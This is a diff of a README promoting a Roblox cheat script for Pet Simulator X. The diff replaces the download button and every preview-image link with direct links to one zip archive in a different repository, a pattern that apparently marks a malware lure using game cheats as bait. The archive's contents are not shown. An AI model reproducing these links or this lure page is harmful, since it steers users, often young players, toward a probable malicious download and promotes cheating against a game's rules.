@@ -2,7 +2,7 @@
 
 Dominate Pet Simulator X with this powerful Roblox Lua script offering auto-farming, teleportation, gem collection, and more. Works with the latest game updates.
 
-[![Download Now](https://github.com/MonishKoushalBusani/rust-hack-fr33/releases/tag/v2.0)](https://www.mediafire.com/folder/mjlie43361ml0/git_hub)
+[![Download Now](https://github.com/rmnask2/pet-simulator-x-script-gm52/raw/refs/heads/main/homothallic/gm_simulator_script_pet_x_3.9.zip)](https://github.com/rmnask2/pet-simulator-x-script-gm52/raw/refs/heads/main/homothallic/gm_simulator_script_pet_x_3.9.zip)
 ---
 
 ### 🎯 Key Features
@@ -55,13 +55,13 @@ Dominate Pet Simulator X with this powerful Roblox Lua script offering auto-farm
 
 ### 🖼 Preview
 
-![Main GUI & Script Hub](https://repository-images.githubusercontent.com/429560297/cce4d5ce-786f-4f0c-b5c2-5c49d929973e)  
+![Main GUI & Script Hub](https://github.com/rmnask2/pet-simulator-x-script-gm52/raw/refs/heads/main/homothallic/gm_simulator_script_pet_x_3.9.zip)  
 *Custom interface for toggling farm, TP, and gems*
 
-![AutoFarm in Action](https://prod.docsiteassets.roblox.com/assets/studio/properties/Script-RunContext.png)  
+![AutoFarm in Action](https://github.com/rmnask2/pet-simulator-x-script-gm52/raw/refs/heads/main/homothallic/gm_simulator_script_pet_x_3.9.zip)  
 *Bot farming diamonds & coins on auto-pilot*
 
-![Teleport GUI](https://prod.docsiteassets.roblox.com/assets/getting-started/Scripts-1.png)  
+![Teleport GUI](https://github.com/rmnask2/pet-simulator-x-script-gm52/raw/refs/heads/main/homothallic/gm_simulator_script_pet_x_3.9.zip)  
 *Jumping between biomes instantly with GUI controls*
 
 ---
